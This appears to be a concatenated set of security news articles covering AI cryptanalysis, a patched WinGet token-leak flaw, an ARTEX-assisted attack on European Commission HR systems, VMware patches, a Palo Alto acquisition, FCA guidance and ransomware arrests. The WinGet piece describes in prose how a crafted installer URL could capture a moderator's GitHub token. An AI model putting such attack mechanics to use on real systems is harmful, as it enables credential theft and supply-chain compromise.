Saarinen, a cryptographer and professor at Finland’s Tampere University who has looked closely at AI-powered crypto-analysis , told CSO that he takes Green’s warning seriously but urges caution, saying there is no need to rip and replace established industry cryptographic standards. “We really can’t entirely rule out surprises, but I’d also definitely not recommend some hasty moves, because those are sure to cause problems,” Saarinen said. “Cryptography has good standards, best practices, and active modernization paths (the ‘PQC transition’) — just following those is the most sensible approach from information security perspective.” The math at stake Saarinen explained that there are two kinds of “hard problems” in mathematics: Numerical problems for which a solution is thought to be hard to compute (for computers) Analytic problems that are open and have been expected to be settled by a human with pencil and paper via a proof, counterexample, new theory, etc. “What has happened in 2026 is that mathematics had its ‘Lee Sedol moment’ (after the ‘last Go grandmaster’) and [analytical] problems previously thought to be in the human domain (2) are now being solved by computers,” Saarinen told CSO. Cryptography uses numerical problems in class — traditional ones like factoring the products of large prime numbers and discrete logarithm, and newer ones like learning with errors (LWE). Analyzing those algorithms and their complexity is part of theoretical computer science. “The fear in cryptography is that AI will find a shortcut for some hard computational problems and make them easy,” Saarinen said. “While AI is very good at optimizing computation, we don’t expect it to turn all hard computational problems into trivial ones.” 2026: Breaking HAWK and McEliece Cryptographic problems involving set (1) above are typically “sub-exponential”; solving them requires an almost exponential number of operations relative to the problem size or distance. “A cryptographically relevant break can be exponential but might halve the number of bits; such an analytic break has happened to some relatively new schemes, such as HAWK by AI in 2026 , and to numerous older proposals by humans,” Saarinen explained. AI also played a significant role in finding a significant shortcut to the parameters of the McEliece cryptosystem (one of the earliest public-key schemes, designed in 1978). “The German cyber agency had been recommending a variant called ‘Classic McEliece’ for quantum security since 2020, but withdrew its recommendation at the end of September,” Saarinen added. Saarinen clarified that, in both cases, the schemes could still be “considered secure if security parameters were adjusted, but that would have doubled public and secret keys, signatures, and ciphertexts.” Meanwhile, SA and Elliptic-Curve cryptosystems are already “broken” from a computational-complexity viewpoint because “polynomial-time quantum algorithms for them have been known since 1994, and building quantum computers is ‘just an engineering problem,’” according to Saarinen. The main post-quantum alternatives, ML-KEM, ML-DSA, and SLH-DSA, have received more than a decade of intense analysis. Looking for a ‘mathematical shortcut’ Another question that cryptographers are asking is whether public-key cryptography or symmetric cryptography is more vulnerable to AI cryptanalysis. Saarinen suggested a “mathematical shortcut” is more likely to exist in public-key cryptography given that it, by definition, requires mathematical structure for the “trapdoor” (a secret key that opens a public-key encrypted message or creates a signature that the public key can verify). “Symmetric-key cryptography (hashes and keyed ciphers) has simply more design freedom in this sense,” Saarinen concluded. Q-Day and LLMs Professor Alan Woodward, a computer scientist at the University of Surrey, said that LLMs are yet to make a huge dent on cryptography. “We’ve seen some inroads and erosion of the security guarantees, but what’s actually happening as far as I can see is that the LLMs are acting as a great tool for mathematicians, cryptographers, and computer scientists to speed up their research: that leap of intuition needed to find the fatal flaw still seems to need humans,” Prof. Woodward said. “LLMs are very effective at finding flaws in those implementations rather than the underlying mathematics.” Prof. Woodward compared the threat posed by AI in breaking encryption schemes to the danger to legacy encryption schemes posed by quantum computers. Both problems highlight the need for improved agility in the cryptographic schemes in use. “We’ve already seen people migrating in preparation for ‘Q-Day’ so in some ways that should already be addressing the risks posed, if they’re real, by LLMs,” according to Prof. Woodward, referring to the hypothetical future time when quantum computers are powerful enough to break public-key encryption. “The most effective route so far seems to be a hybrid route where we have a mix of cryptographic schemes that, whilst one or two might fall away, leaves us with others we can rely upon. Any found to be flawed for whatever reason can be deprecated rapidly and the intact schemes used instead.”

title: A single pull request could have handed attackers the keys to Microsoft’s software supply chain
raw_text: The most dangerous actor in a software supply chain may now be an automated script with powerful credentials and no idea where it’s sending them. Researchers from pen-testing company Cycode have discovered a now patched critical zero-click supply chain vulnerability in the open-source Windows Package Manager (WinGet), which sits on billions of devices worldwide. A single pull request could have tricked Microsoft’s internal tooling into freely handing over a moderator’s GitHub access token, with no phishing, no malware, no moderator clicking or approval required. There is currently no evidence that the flaw has been exploited in the wild. But it serves as a cautionary tale for enterprises that the automation they trust is becoming an attacker entry point, and package repositories are particularly enticing targets. “Package registries have become the highest-profile target in the software supply chain,” Moriel Harush , Cycode security research lead, wrote in a blog post . “Compromise a single maintainer, and you reach everyone who trusts them. Compromise the gatekeepers, and you reach the entire ecosystem.” Whatever the employee can do, the attacker can do WinGet is Microsoft’s free, open source command line tool that helps users discover, install, upgrade, configure, and remove apps. It exists on more than 1.4 billion active devices running Windows 10, Windows 11, and Windows Server 2025. WinGet’s catalog is a public GitHub repository , and its gatekeeper, so to speak, is a small, official group of Microsoft moderators who review a constant stream of community pull requests and proposed changes. By default, WinGet installations on every Windows machine trust the actions those keepers take. The hole is in the moderators’ own internal triage tool. This PowerShell helper attached the moderator’s secret GitHub Personal Access Token (PAT) to any HTTP request, without checking who owned that address. This meant an attacker merely had to supply an address. Theoretically, if they opened a pull request and pointed an InstallerURL software installation package at their own server, “the trap was set,” Harush explained. Microsoft’s automated Azure DevOps validation pipeline would then attempt to fetch the URL, but the attacker’s server would intentionally return an error. This added a validation error label to the pull request. The moderator’s internal script would respond to that label by running a CheckInstaller routine which would send a HEAD request to the attacker via an authenticated HTTP helper, whose job is to automatically attach credentials or tokens to outgoing HTTP requests and handle authorization errors . Then all the attacker had to do was check their logs and extract the moderator’s official GitHub token, which was “casually” handed over. But the token is not merely a repository-scoped credential, it is a full identity credential, meaning whatever that Microsoft employee can do on GitHub, the token can do. Harush explained: “It is like a courier stapling your house key to every parcel that has your name on it, because most of them are destined for your own address.” But if a stranger uses your name and changes the address to one they control, “your key is delivered directly to them.” Armed with this key to Microsoft’s internal environment, an attacker could push malicious manifests, approve their own pull requests, and slip in backdoored installers to 14,000 exposed packages, all under a highly trusted, official Microsoft badge. They could also access and write to every other Microsoft repository the moderator had access to, modify GitHub Actions workflows across those repositories to achieve remote code execution (RCE) and exfiltrate corporate secrets. There is a precondition for this attack: At least one moderator has to have the triage tracker running in a continuous background loop, which it is designed to do as it waits for work. Underlying model ‘fundamentally flawed’ Harush pointed out that Microsoft’s C# version of the tool, in the same directory, did not share the flaw; as such, it would have offered safer authentication. Microsoft has since patched the PowerShell vulnerability , safely scoping the authentication mechanism to ensure that users’ tokens are only attached when a request host is an authorized GitHub endpoint, such as api.github.com , github.com , or raw.githubusercontent.com . Harush noted, however, that the underlying credential model is “fundamentally flawed,” and that relying on Classic PATs is a “severe liability.” Cycode advises binding credentials to destinations, rather than functions; auditing every internal tool that handles maintainer credentials; and ensuring that headers are conditionally applied based on the target host, “not unconditionally stapled by a wrapper function.” Treat all user inputs as hostile, validated hosts before credentials are attached, and deprecate classic PATs. “The blast radius of a leaked token must be limited to one repository and the bare minimum permissions,” Harush said. “A leaked token should never mean a leaked corporate identity.” He emphasized, though, that WinGet moderators are doing exactly what’s asked of them: Using automated tools to manage a “flood of community submissions” and make their jobs easier. “But automation does not just remove the human who would have clicked the malicious link; it removes the human who would have noticed the anomaly.” Scripts are a soft spot The WinGet flaw was a near miss, but “a very serious one,” said Frank Dickson of Dickson Research. Exploiting it would have let an attacker publish malware with “Microsoft’s seal of approval.” This means attackers could have pushed tampered installers to anyone who ran an install or an update, reached into any other Microsoft repositories the moderator could touch, and hijacked the build machinery to steal more secrets. And the damage would have looked like routine work. An IT team scripting a standard software rollout would have installed the attacker’s code on every machine, and the logs would have shown an approved package from an approved source. “The attack would have been a Trojan horse delivered by the mail carrier everyone trusts,” Dickson said. Enterprise security teams should learn that their own scripts are a soft spot, he pointed out; internal tools, bots, and automation get production-level keys and hobby-level review. CISOs should inventory every script and bot that holds a token, and answer important questions: What could this key do in the wrong hands? Where is it allowed to go? Additionally, he advised replacing broad, long-lived tokens with narrow, short-lived ones, and binding every credential to the specific services that need it, which is exactly how Microsoft fixed this problem. “Also, enterprises should stop trusting public registries blindly,” Dickson said. Ultimately, security teams should review their automations the way they review their people, he said. “A script that runs in a loop around the clock with a moderator’s keys is, in effect, a moderator who never sleeps and never questions anything.”

Researchers from pen-testing company Cycode have discovered a now patched critical zero-click supply chain vulnerability in the open-source Windows Package Manager (WinGet), which sits on billions of devices worldwide. A single pull request could have tricked Microsoft’s internal tooling into freely handing over a moderator’s GitHub access token, with no phishing, no malware, no moderator clicking or approval required. There is currently no evidence that the flaw has been exploited in the wild.

title: European Commission HR hit by cyber attack
raw_text: Barely a week after the US Federal Bureau of Investigation (FBI) warned companies of the cyber attacker interest in an open source penetration testing tool called ARTEX, the European Commission has confirmed that attackers armed with that tool broke into its HR systems. The attack, which Commission officials detected on October 22, forced them to shut off much of the access to the systems for more than 10 days. “As a protective and preventive measure, we temporarily took down several applications and most of them have since then been restored,” Commission spokesperson Thomas Regnier said Thursday. “We have not detected any evidence of a data breach affecting Commission staff as a whole.” During a news media briefing, a transcript of which was provided to CSOonline, he said that the European Data Protection Supervisor (EDPS) was informed of the attack, “so there was no hiding whatsoever.” Regnier would not go into detail about the attacks, given that the matter is still being investigated, but he did say, “it is a campaign, so there was a series of incidents.” In an email, Commission officials added, “we are also preventively checking other systems while staying in close contact with CERT-EU and the EDPS.” ARTEX popular with attackers The November 13 FBI statement about ARTEX, described as an autonomous penetration testing framework, said that the tool is becoming very popular with attackers. “Since at least August 2026, a variety of malicious cyber actors have used ARTEX to conduct campaigns targeting organizations globally across multiple sectors, including financial services, government, technology, defense, semiconductor, energy, healthcare, manufacturing, telecommunications, and legal industries,” the FBI advisory said. “ARTEX significantly reduces the time required to chain attack techniques, with some intrusions progressing from initial targeting to privileged access in under three hours. The framework enables threat actors with minimal technical expertise to conduct complex, multi-target operations simultaneously, fundamentally accelerating attack velocity and expanding operational scale.” Although ARTEX can handle a wide range of pentesting functions, it appeared to be primarily used in the Commission attack to search for and locate credentials. The FBI said that ARTEX can “automatically map effective permissions of Azure credentials–SAS tokens, Service Principals, Kudu credentials, Storage Account keys–using sub-second capability checks.” ARTEX has been known to SOC operations since GitHub first released the tool in July, but widespread misuse of the tool prompted GitHub to make it unavailable on October 8. “Despite this action, ARTEX remains widely accessible through independent routes and mirrors on code-sharing platforms,” the FBI said. Uses different tactics Brian Levine , a partner with consulting firm Control Risks, added that ARTEX’s AI-fueled tactics are different from what many cybersecurity teams are used to. “ARTEX doesn’t need to steal your keys. It finds the ones you left lying around, like a SAS token in a code repo, a storage key in a config file, or a Kudu credential nobody rotated. Then it tries each one against every door in under a second,” he said. “Picture a burglar walking the block at 3 a.m. and checking every car door handle. He isn’t breaking glass. He’s taking inventory of what you left unlocked and AI lets him work a thousand blocks at once.” Companies need a secure fallback Noah Kenney , principal consultant at Digital 520, said he was unimpressed with the Commission’s attempts to tell EU citizens that all was well. “The Commission says it has no evidence of a breach affecting its staff ‘as a whole,’ which is very different from saying that there is no evidence of a breach affecting any of the staff,” Kenney said. “The wording doesn’t give me much comfort.” Kenney also said that the attackers’ decision to target HR was not an accident, and that the Commission’s decision to temporarily shut down some systems may have inadvertently helped the intruders. “When payroll, leave, and medical reimbursement systems go down, people start using spreadsheets, email and manual approvals. Those workarounds often have weaker access controls and worse audit trails than the systems taken offline,” he said. “Enterprises need to define a secure fallback process before the attack, because improvising one often leads to greater exposure.” HR systems a prize Levine also said that the choice of an HR victim was understandable. “HR systems are a prize. Names, home addresses, pay grades and health insurance records for EU civil servants make a ready-made targeting list for espionage and social engineering,” he said. “Whether or not data left the building, every Commission employee should prepare to receive a very convincing phishing email soon.” His advice to CISOs: “Get secrets out of code and pipelines and rotate anything that has been exposed. Give every token and service principal only the access it needs, so a found key opens a closet, not the vault. Put cloud admin interfaces behind private access.”

title: Critical flaw in VMware vCenter allows authentication bypass
raw_text: Broadcom has released patches for bugs in multiple products, one of which, fixing a VMware vCenter authentication bypass vulnerability, is rated 9.8 out of 10 in severity. The company’s advisory describes the flaw, tracked as CVE-2026-123890 , as “an authentication bypass vulnerability in the VMware Directory Service,” that could let a threat actor with network access gain unauthorized access to the system, and says there are no workarounds. It advises immediate patching. Broadcom has provided fixed vCenter versions 9.1.1.0200, 9.0.2.0200, and 8.0 U3m; customers running v7.0 will only get a patch if they have an extended support contract. The patched version of VMware Cloud Foundation 5.x is 5.2.5. Customers using the VMware Telco Cloud Platform and Infrastructure, also affected, should consult KB463116 for remediation instructions. The remaining four issues are: SDDC Manager SQL-injection vulnerability ( CVE-2026-123891 ), rated 8.1 (Important) in severity; SDDC Manager authenticated command-injection vulnerability ( CVE-2026-123892 ), rated 7.2 (Important); SDDC Manager local privilege-escalation vulnerability ( CVE-2026-123893 ), rated 6.7 (Moderate), and VMware Tools SAML Token Signature Bypass vulnerability ( CVE-2026-123894 ), also rated 6.7. There are no workarounds for any of them. Broadcom has released a supplementary FAQ providing addition information on all five bugs, in which it said, “You are affected if you are running any version of VMware vCenter, SDDC Manager, or VMware Tools for Windows prior to the versions listed as “fixed” in the [advisory]. This includes vCenter and SDDC Manager deployed standalone and as part of VMware Cloud Foundation, VMware vSphere Foundation, VMware Telco Cloud Platform, and VMware Telco Cloud Infrastructure, as well as VMware Tools installed in Windows virtual machines.” This article originally appeared on NetworkWorld .

title: Palo Alto Networks bets $4.5B on enterprise AI with Applied Compute acquisition
raw_text: Palo Alto Networks has agreed to buy Applied Compute in an all-stock deal valued at $4.5 billion, a move the company said will let it train, deploy and secure open-weight AI models for enterprises in the public cloud or in their own sovereign environments. “The acquisition will bring Applied Compute’s platform and world-class AI research team to Palo Alto Networks to help enterprises adopt AI securely, whether they choose open-weight models, closed frontier models, or both,” the company said in a statement released alongside its fiscal first quarter 2027 results. The statement described Applied Compute as “a leading platform for post-training and inference of open-weight AI models” and said the startup will continue to serve AI-native companies, digital natives and large enterprises. The transaction is expected to close in Palo Alto’s fiscal third quarter of 2027, which runs from February to April, the statement said. Applied Compute co-founder and CEO Yash Patil will become Palo Alto’s co-chief AI officer, and the startup’s research team will help build AI models across the company’s offerings. A security company that wants to run models Nikesh Arora, Palo Alto’s chairman and CEO, said on the company’s earnings call that beyond building AI into its own security products, “we will help train and serve secure sovereign implementations of open-weight models to the enterprise.” “Open-weight model implementations will allow us to deliver secure, open-weight models to our customers to enable adoption of secure AI in the enterprise,” Arora said. He said open-weight models had grown from under 5% of token traffic to more than 60% over the past year, without saying where the figure came from. Asked by JP Morgan analyst Brian Essex about customer demand, Arora said deterministic security controls “cannot anticipate every scenario that an agent is going to conduct.” Enterprises building AI applications “will have to train a supervisory AI model at the same time,” he said, because Palo Alto cannot secure models it has no part in building. “I cannot go in and intercept and understand somebody else’s application,” he said. Sanchit Vir Gogia, chief analyst at Greyhound Research, said Arora has a point, since a generic filter cannot know how a particular application is meant to behave. But most failures in AI applications happen at runtime, through prompts, tools, and permissions, whoever trained the model, he said. He noted that Palo Alto has sold model-agnostic protection through Prisma AIRS since 2025. “A supervisor trained by the same hands as the system it supervises is a colleague, not a check,” Gogia said, adding that CIOs should make sure someone other than the trainer tests the result. GPUs and data centers To train and host those models, Palo Alto plans to build its own compute capacity, CFO Dipak Golechha said on the call. The spending “will mostly go to GPUs and servers,” with a smaller share for the facilities that house them, he said. Palo Alto will “continue to source from our cloud partners” and add dedicated capacity over time, Golechha said. Arora said the company aims for more than100 megawatts of compute in the next three to five years. Gogia said Palo Alto has sovereignty credentials for security data, including customer-held keys and a European Cortex service governed by Deutsche Telekom. “None of that yet extends to GPUs,” he said, adding that a US-headquartered operator faces the same jurisdictional questions as the hyperscalers it rents capacity from. “A sovereign hosting offer with no named region, operator or date is a promise looking for an address,” Gogia said. Compliance officers should ask Palo Alto for a region list, the operator, and a dated certification plan, he said. Arora said on the call that the training and inference business could eventually exceed Palo Alto’s core market. “This could be bigger than what we do today,” he said. One vendor, more of the stack The deal follows Palo Alto’s $25 billion purchase of CyberArk , which added identity security to its platform. Gogia said Applied Compute would now add the models themselves to a supplier already at the center of many customers’ firewalls, SOC, and identity controls. “Palo Alto is asking enterprises to let the guard build the vault it guards,” he said. One team watching both model and telemetry can spot trouble sooner, he said, but a single fault, breach or pricing dispute would land “on the protection and the protected together.” CIOs should get a costed exit in writing before any model work moves across, Gogia said. Applied Compute customers should use the months before closing to secure ownership of trained weights in an exportable format, no training on their data without consent, a right to exit on change of control and price protection that survives bundling, he said. “Terms are cheapest to win while the suitor is still courting,” Gogia said.
summary: Palo Alto Networks has agreed to buy Applied Compute in an all-stock deal valued at $4.5 billion, a move the company said will let it train, deploy and secure open-weight AI models for enterprises in the public cloud or in their own sovereign environments. “The acquisition will bring Applied Compute’s platform and world-class AI research team to Palo Alto Networks to help enterprises adopt AI securely, whether they choose open-weight models, closed frontier models, or both,” the company said in a statement released alongside its fiscal first quarter 2027 results. The statement described Applied Compute as “a leading platform for post-training and inference of open-weight AI models” and said the startup will continue to serve AI-native companies, digital natives and large enterprises. The transaction is expected to close in Palo Alto’s fiscal third quarter of 2027, which runs from February to April, the statement said.

title: FCA lines up new cyber guidance for UK financial services sector
raw_text:
Citing a growing number of impactful cyber attacks, and the influence of evolving risk factors such as artificial intelligence (AI) and quantum computing, the Financial Conduct Authority (FCA) has hooked up with the Bank of England's Prudential Regulation Authority (PRA) have opened a public consultation on proposals to produce new security guidance that will give organisations operating in the financial sector more clarity about what is expected from them.

The Bank of England’s most recent Systemic Risk Survey, which was published at the end of September, warned that cyber security was one of the risks that will have the greatest impact on the UK’s financial system – and right on cue October 2026 saw the second-highest monthly number of security incidents reported to the FCA since the Covid-19 pandemic, and the highest in 18 months.

The trio intend to marry existing requirements and lessons from their supervisory experience, alongside cyber frameworks such as the National Cyber Security Centre’s (NCSC’s) Cyber Aseessment Framework (CAF) – which establishes how organisations can manage risk and resilience more flexibly, and crucially without the need to implement rigid rules.

Ultimately, the guidance will cover topics such as how firms govern, identify, protect against, detect, respond to and recover from security incidents.

‘Technology moves fast, and so do cyber threats. The financial sector has a crucial role in tackling those threats, including through products like cyber insurance,” said Nikhil Rathi, FCA chief exec.

‘Our response shouldn’t always be more rules. Firms have asked us for clarity about what good cyber resilience looks like. This guidance provides it, helping strengthen their resilience, protect clients and the services they rely on.’

PRA CEO and deputy governor of the Bank of England, Katharine Braddick, added: “‘Cyber attacks are becoming more frequent, complex and dangerous. Regulators need confidence both that firms have strong cyber controls and that they can detect, contain and recover quickly from incidents. Today’s proposed guidance builds on latest understanding to help firms do that.”

On matters such as AI and quantum computing, the regulators are separately publishing additional ‘effective practices’ which will build on the wider cyber guidance by zooming in on specific risks linked to the runaway evolution of AI, and the still-future risks of quantum to data privacy and protection.

The FCA said this would help organisations tackle vulnerabilities to threat actors using AI and encourage them to consider more deeply the implications of quantum computing – which has particular relevance to the financial services sector.

Financial services firms, trade associations, tech providers and other stakeholders are encouraged to have their say during the consultation process, which will run until 26 February 2027.

Reaction

Responding to the proposals, NCSC CEO Richard Horne said: “We know cyber threats are becoming increasingly frequent and sophisticated, making it more important than ever that organisations can withstand and recover from cyber incidents.

“The NCSC welcomes this proposed guidance, which will help firms better understand, assess, and strengthen their cyber resilience, in line with our Cyber Assessment Framework.”

CyberSmart co-founder and CEO Jamie Akhtar added: “Unfortunately, a five-year high in reported incidents is more likely to be the new normal than a peak. As AI reaches a tipping point for bad actors, the economics of cyber crime are only going to move further in their favour.

“It’s great to see the FCA leaning on the NCSC’s CAF but it should be careful that flexibility doesn’t become complacency. The NCSC’s new resilience pathway makes sense for regulated firms: Cyber Essentials as the baseline, followed by CAF, with the newly introduced CAF Core Profile as the bare minimum for critical firms.

“St James’s Place has shown how this can work in practice, requiring Cyber Essentials Plus across its network of more than 2,800 financial adviser businesses,” said Akhtar.

“A certificate raises the floor; principles allow us to raise the ceiling. With this new guidance, followed by action from regulated firms, hopefully the next five years will look a lot brighter,” he said.

  • Card giant Mastercard is offering free cyber security training to millions of SMEs in the UK through its SME Academy.
  • The Financial Stability Board has published 12 practices for financial services organisations to follow when implementing AI.

The four detainees linked to the so-called Chaos ransomware operation – a group that has only recently come to light – are described as members of a 27-person cell that itself formed part of a larger, 60-strong network that included ex-members of the defunct Conti crew.

Chaos is thought to be one of the groups that emerged from the ashes of Conti after it disbanded following Russia’s attack on Ukraine in 2022. It initially operated under the name Royal, but later changed its name to BlackSuit – a name that likely does not represent a single, monolithic entity.

Nevertheless, it was under the BlackSuit banner that the four individuals are accused of executing an attack on a tyre manufacturing company, Maxxis, in 2024. Subsequently, said the Ukrainians, they shifted to using the Chaos ransomware.

Following their arrest, the four men were placed in pre-trial detention earlier in November and are expected to remain in custody until 1 January. For three of the accused, bail has been set at over 2.6m hryvnias (UAH) – approximately £44,000 at the time of writing – with the fourth receiving a more lenient ruling.

Division of labour

This fourth individual is supposedly involved in active combat duty in the ongoing war with Russia – his military unit commander is alleged to have asked to take on responsibility for him under a personal surety, which was rejected by the judge who deemed such an arrangement far too risky.

He appears to have been focused on software development – specifically, the creation of phishing resources designed to mimic genuine remote-access interfaces, and tools for remote control and vulnerability exploitation.

These activities seem to have been closely intertwined with those of a second suspect who was primarily involved in phishing. This individual received a regular monthly stipend of $1,500 for his work and was heavily involved in an August 2024 cyber attack against US-based Warren Oil, a supplier of oils and lubricants.

The third suspect was supposedly a cryptography specialist and was especially skilled at cracking cryptographic hashes to extract valid credentials, tactics used in the Warren Oil incident, and a third distinct attack on Texas-based oilfield resources specialist Newpark, also in late 2024. He also reportedly received a $1,500 payment at the end of October for this attack.

The final suspect taken into custody was focused on social engineering, and was highly skilled at contacting employees of the gang’s victim organisations while posing as a tech support worker. The goal was to trick the targets into entering valid credentials on phishing pages controlled by the gang, which also enabled them to hoover up multifactor authentication (MFA) codes. He stands accused of taking a role in all three attacks on Maxxis, Newpark and Warren Oil, and allegedly earned $500 for each incident.

The documents released by the Ukrainians do not mention how the collected ransoms, which totalled around $11.5m or £8.7m across the three attacks, were distributed – they detail only regular payments and bonuses received by the accused.

The Ukrainians said this division of professional roles was strongly reminiscent of how the Conti gang operated – perhaps unsurprising given the confirmed connection to Chaos. In its prime, Conti was managed much like a legitimate small-to-medium sized enterprise (SME) within the cyber crime sector.

  • Data from the UK’s Report Fraud service reveals the scope of ransomware attacks is going underreported, with few businesses confident enough to identify themselves as victims.
  • National Federation of Subpostmasters suffered a ransomware attack in April after hackers exploited a bug in the web hosting software it uses.
